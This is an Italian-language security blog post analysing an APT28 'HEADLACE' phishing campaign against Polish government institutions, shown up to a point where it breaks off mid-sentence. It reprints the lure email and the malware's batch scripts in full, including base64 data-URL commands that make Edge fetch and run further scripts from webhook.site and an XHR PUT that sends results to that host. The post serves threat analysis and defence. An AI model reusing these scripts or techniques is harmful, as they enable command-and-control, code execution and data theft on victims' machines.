---
title: APT28_HEADLACE
url: https://blog.lobsec.com/2025/12/apt28_headlace/
source: Over Security - Cybersecurity news aggregator
date: 2025-12-18
fetch_date: 2025-12-19T03:23:24.375036
---

# APT28_HEADLACE

[Vai al contenuto](#content "Vai al contenuto")

[Lobsec](https://blog.lobsec.com/)

Yet another security blog

Menu

Menu

* [CV (ITA)](https://blog.lobsec.com/cv-ita/)
* [Privacy policy](https://blog.lobsec.com/privacy-policy/)

# APT28\_HEADLACE

2025-12-18 di [lobst3r](https://blog.lobsec.com/author/lobst3r/ "Visualizza tutti gli articoli di lobst3r")

I team **CERT Polska (CSIRT NASK)** e **CSIRT MON** hanno rilevato una campagna malware su larga scala diretta contro le istituzioni governative polacche. Sulla base degli indicatori tecnici (IoC) e delle analogie con attacchi documentati in precedenza (ad esempio contro entità ucraine), la campagna è riconducibile all’**activity set** del gruppo **APT28**, attore accreditato al **Main Directorate of the General Staff of the Armed Forces** della Federazione Russa (**GRU**).

Sulla riga di articoli già presenti in rete, ho cercato di fare una disamine generale delle tecniche di attacco a partire dai vettori di accesso, alle compromissioni per terminare con le le tecniche di evasione sfruttate e gli indicatori di compromissione.

Ho cercato inoltre di esaminare tutti gli stage intermedi dandone una spiegazione sintetica e – spero – chiara.

## Analisi preliminare

La campagna è stata veicolata tramite l’invio di e-mail caratterizzate da un contenuto di **social engineering** volto a catturare l’interesse del destinatario e indurlo a interagire con un collegamento ipertestuale malevolo.

```
Subject: I solved your problem

Hello Paweł!
I did a little research and found this mysterious Ukrainian woman.
Now she is in Warsaw.
She runs a rather unusual company that sells used underwear.
also has clients from senior authorities in Poland and Ukraine.
All information on this subject is available at this link - ALINA-BOKLAN
```

Il collegamento punta a un indirizzo registrato sotto il dominio **run.mocky.io**, un servizio gratuito utilizzato dagli sviluppatori per il prototyping e il testing di API. Nello specifico, il servizio è stato impiegato come **redirection layer** verso l’endpoint **webhook.site**, una piattaforma che consente il logging di tutte le query HTTP dirette all’indirizzo generato e la configurazione di risposte personalizzate. Anche quest’ultimo portale gode di ampia diffusione in ambito IT.

L’adozione di servizi legittimi di terze parti (Living-off-the-Trusted-Service), in sostituzione di domini di proprietà dell’attaccante, permette di eludere i sistemi di **reputation filtering** e di ridurre drasticamente le probabilità che i link vengano classificati come malevoli, abbattendo al contempo i costi operativi dell’infrastruttura. Si tratta di un trend consolidato, osservato nelle TTP (*Tactics, Techniques, and Procedures*) di numerosi gruppi APT.

Infine, dal sito webhook.site viene scaricato un archivio ZIP il cui naming convention è progettato per simulare contenuti multimediali (es. immagini). Il file segue il pattern `IMG-` seguito da una stringa numerica casuale (ad esempio: `IMG-238279780.zip`). Una volta aperto l’archivio, qualora nel sistema della vittima siano attive le configurazioni di default di Windows (estensioni file nascoste e file nascosti non visualizzati), l’utente visualizzerà la seguente interfaccia:

![](https://blog.lobsec.com/wp-content/uploads/2025/12/image-3.png)

## Analisi tecnica

L’archivio contiene in realtà tre file distinti:

* Un eseguibile legittimo della **calcolatrice di Windows**, rinominato (ad esempio `IMG-238279780.jpg.exe`) per simulare un file d’immagine e indurre la vittima all’esecuzione.
* Uno **script batch (.bat)**, impostato con l’attributo di file nascosto.
* Una libreria malevola contraffatta denominata **WindowsCodecs.dll**, anch’essa configurata come file nascosto.

Nel momento in cui la vittima esegue il file `IMG-238279780.jpg.exe` – che di per sé è un binario innocuo – il processo, durante la fase di inizializzazione, tenta di caricare la libreria `WindowsCodecs.dll` presente nella medesima directory, caricando di fatto quella manipolata dagli attaccanti. Questa tecnica è nota come **DLL Side-Loading**. L’unico scopo della DLL malevola è quello di fungere da loader per eseguire lo script BAT incluso nell’archivio.

```
@echo off
if not DEFINED IS_MINIMIZED (
    set IS_MINIMIZED=1
    start "" /min "%~dpnx0" %*
    exit
)

start msedge data:text/html;base64,PHRpdGxlPklNRy02MzQ5MjMzNjk2OC5qcGc8L3RpdGxlPjxpZnJhbWUgc3JjPSJodHRwczovL3dlYmhvb2suc2l0ZS9hYWU0MmFlNC1mM2VhLTRkYmYtYTMzZi0zZmY1YjFiYWVjOWIiIHN0eWxlPSJwb3NpdGlvbjpmaXhlZDsgdG9wOjA7IGxlZnQ6MDsgYm90dG9tOjA7IHJpZ2h0OjA7IHdpZHRoOjEwMCU7IGhlaWdodDoxMDAlOyBib3JkZXI6bm9uZTsgbWFyZ2luOjA7IHBhZGRpbmc6MDsgb3ZlcmZsb3c6aGlkZGVuOyB6LWluZGV4Ojk5OTk5OTsiPjwvaWZyYW1lPg==
timeout 15 > nul
move %userprofile%\downloads\IMG-63492336968.jpg %programdata%\IMG-63492336968.cmd > nul
type nul > %userprofile%\downloads\IMG-63492336968.jpg
call %programdata%\IMG-63492336968.cmd
del /q /f /a %0
exit
```

Lo script BAT avvia il browser Microsoft Edge, il quale esegue il rendering di contenuti di pagina codificati in Base64 per effettuare il download di un secondo batch script (utilizzando nuovamente il servizio webhook.site).

![](https://blog.lobsec.com/wp-content/uploads/2025/12/image-5-1024x113.png)

Contemporaneamente, il browser visualizza immagini reali di una modella in costume da bagno, complete di link ai suoi profili social autentici. Questa tecnica di **diversionary tactic** mira a conferire credibilità alla narrazione degli attaccanti e a neutralizzare la vigilanza del destinatario, mascherando l’attività malevola in background.

Degno di nota il commento di Kevin Beaumont sull’argomento

![](https://blog.lobsec.com/wp-content/uploads/2025/12/image-7-1024x640.png)

Continuando l’analisi, a livello di file system, lo script salva il payload scaricato sul disco con estensione `.jpg`, procede successivamente al renaming del file mutandone l’estensione in `.cmd` e, infine, ne invoca l’esecuzione.

```
@echo off & (
    echo On Error Resume Next
    echo CreateObject("WScript.shell").Run "^""%%programdata%%\\dee016bf-21a2-45dd-86b4-6099747794c4.bat^"^^"", 0, False
    echo Set oFso = CreateObject("Scripting.FileSystemObject") : oFso.DeleteFile Wscript.ScriptFullName, True
) > "%programdata%\dee016bf-21a2-45dd-86b4-6099747794c4.vbs" & echo del %%0 ^& for /l %%%%n in () do (
    chcp 65001 ^& timeout 300 ^& taskkill /im msedge.exe /f ^& timeout 5 ^& del /q /f "%%userprofile%%\Downloads\*.css" ^& start "" msedge --headless=new --disable-gpu data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24ucmVwbGFjZSgiaHR0cHM6Ly93ZWJob29rLnNpdGUvZGVlMDE2YmYtMjFhMi00NWRkLTg2YjQtNjA5OTc0Nzc5NGM0Iik7PC9zY3JpcHQ+ ^& timeout 30 ^& taskkill /im msedge.exe /f ^& move /y "%%userprofile%%\Downloads\*.css" "%%programdata%%\dee016bf-21a2-45dd-86b4-6099747794c4.cmd" ^& call "%%programdata%%\dee016bf-21a2-45dd-86b4-6099747794c4.cmd" ^& del /q /f "%%programdata%%\dee016bf-21a2-45dd-86b4-6099747794c4.cmd"
) > "%programdata%\dee016bf-21a2-45dd-86b4-6099747794c4.bat" & (
    echo ^<!DOCTYPE html^>^<html^>^<body^>^<script^>var xhr = new XMLHttpRequest^(^);var text = String.raw^`)
) > "%programdata%\uaxhexd.tab" & (
    echo ^`;xhr.open^(^'PUT^', ^'https://webhook.site/dee016bf-21a2-45dd-86b4-6099747794c4^'^);xhr.setRequestHeader^(^'Content-Type^', ^'text/html^'^);xhr.send^(text^);^</script^>^</body^>^</html^>
) > "%programdata%\ohqddqtqc.tsv" & start "" "%programdata%\dee016bf-21a2-45dd-86b4-6099747794c4.vbs" & del %0
```

Questo script costituisce il **main loop** della catena d’infezione. Attraverso l’iterazione del ciclo `for /l %n in ()`, il sistema osserva inizialmente una fase di **sleep** di 5 minuti; successivamente, seguendo la medesima logica descritta in precedenza, scarica un ulteriore script tramite Microsoft Edge interfacciandosi con l’endpoint **webhook.site**. In questa istanza, il payload viene scaricato con estensione `.css`, per poi essere rinominato in `.cmd` e invocato in esecuzione.

Lo script finale analizzato ...